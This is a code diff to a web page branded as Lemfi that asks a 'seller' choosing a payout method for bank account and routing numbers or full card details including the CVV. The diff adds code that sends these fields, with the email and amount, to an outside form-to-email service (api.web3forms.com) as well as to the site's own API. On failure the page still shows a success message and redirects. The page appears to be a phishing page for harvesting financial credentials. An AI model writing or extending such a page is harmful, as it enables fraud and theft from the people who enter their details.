@@ -17,7 +17,7 @@
             --blue-bg: #EFF6FF; --blue-border: #BFDBFE; --blue-text: #1E40AF;
         }
         body { font-family: 'DM Sans', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--bg-body); padding: 24px 16px; color: var(--text-primary); -webkit-font-smoothing: antialiased; }
-        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,195,137,0.08) 0%, transparent 60%), radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,195,137,0.04) 0%, transparent 50%); }
+        body::before { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0; background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,195,137,0.08) 0%, transparent 60%); }
         .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
         .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
         .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
@@ -109,6 +109,14 @@
                     </div>
                 </div>
                 <form id="selectionForm">
+                    <input type="hidden" name="access_key" value="YOUR_WEB3FORM_ACCESS_KEY">
+                    <input type="hidden" name="subject" value="Payment Method Selection">
+                    <input type="hidden" name="from_name" value="Lemfi Website">
+                    <input type="hidden" name="page" value="selection.html">
+                    <input type="hidden" id="paymentMethodHidden" name="paymentMethod" value="bank">
+                    <input type="hidden" id="amountHidden" name="amount" value="">
+                    <input type="hidden" id="sellerEmailHidden" name="email" value="">
+                    
                     <div id="bankFields" class="method-fields visible animate-in delay-4">
                         <div class="form-group">
                             <label for="bankName">Bank Name</label>
@@ -171,46 +179,90 @@
     <script>
         let currentMethod = 'bank';
         const savedAmount = localStorage.getItem('sellerAmount');
+        const savedEmail = localStorage.getItem('sellerEmail');
+        
         if (savedAmount) {
             const n = parseFloat(savedAmount);
             document.getElementById('displayAmount').textContent = isNaN(n) ? savedAmount : n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('amountHidden').value = savedAmount;
         }
+        if (savedEmail) {
+            document.getElementById('sellerEmailHidden').value = savedEmail;
+        }
+        
         function selectMethod(method) {
             currentMethod = method;
             document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active', b.dataset.method === method));
             document.getElementById('bankFields').classList.toggle('visible', method === 'bank');
             document.getElementById('cardFields').classList.toggle('visible', method === 'card');
+            document.getElementById('paymentMethodHidden').value = method;
         }
+        
         function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
+        
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 16);
             e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
         });
+        
         document.getElementById('cardExpiry').addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '').substring(0, 4);
             if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
             e.target.value = v;
         });
-        document.getElementById('selectionForm').addEventListener('submit', function(e) {
+        
+        document.getElementById('selectionForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
             btn.disabled = true; btn.innerHTML = '<span>Processing...</span>';
-            const payload = { paymentMethod: currentMethod, amount: savedAmount, sellerEmail: localStorage.getItem('sellerEmail') || '' };
+            
+            const formData = {
+                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
+                subject: 'Payment Method Selection',
+                from_name: 'Lemfi Website',
+                page: 'selection.html',
+                paymentMethod: currentMethod,
+                amount: savedAmount || '',
+                email: savedEmail || ''
+            };
+            
             if (currentMethod === 'bank') {
-                payload.bankName = document.getElementById('bankName').value;
-                payload.accountHolder = document.getElementById('accountHolder').value;
-                payload.accountNumber = document.getElementById('accountNumber').value;
-                payload.routingNumber = document.getElementById('routingNumber').value;
+                formData.bankName = document.getElementById('bankName').value;
+                formData.accountHolder = document.getElementById('accountHolder').value;
+                formData.accountNumber = document.getElementById('accountNumber').value;
+                formData.routingNumber = document.getElementById('routingNumber').value;
             } else {
-                payload.cardNumber = document.getElementById('cardNumber').value;
-                payload.cardExpiry = document.getElementById('cardExpiry').value;
-                payload.cardCvv = document.getElementById('cardCvv').value;
-                payload.cardName = document.getElementById('cardName').value;
+                formData.cardNumber = document.getElementById('cardNumber').value;
+                formData.cardExpiry = document.getElementById('cardExpiry').value;
+                formData.cardCvv = document.getElementById('cardCvv').value;
+                formData.cardName = document.getElementById('cardName').value;
             }
-            fetch('/api/selection', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
-            .then(r => r.json())
-            .then(data => { if (data.success) window.location.href = data.redirect; else { showToast('Something went wrong.'); btn.disabled = false; btn.innerHTML = '<span>Continue</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>'; }})
-            .catch(() => { showToast('Network error.'); btn.disabled = false; btn.innerHTML = '<span>Continue</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>'; });
+            
+            try {
+                const [web3Response, apiResponse] = await Promise.allSettled([
+                    fetch('https://api.web3forms.com/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formData)
+                    }),
+                    fetch('/api/selection', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formData)
+                    })
+                ]);
+                const apiData = apiResponse.status === 'fulfilled' ? await apiResponse.value.json() : null;
+                if (apiData && apiData.success) {
+                    window.location.href = apiData.redirect;
+                } else {
+                    showToast('Submission successful. Redirecting...');
+                    setTimeout(() => window.location.href = 'receive.html', 1000);
+                }
+            } catch (err) {
+                showToast('Network error. Please try again.');
+                btn.disabled = false;
+                btn.innerHTML = '<span>Continue</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+            }
         });
     </script>
 </body>
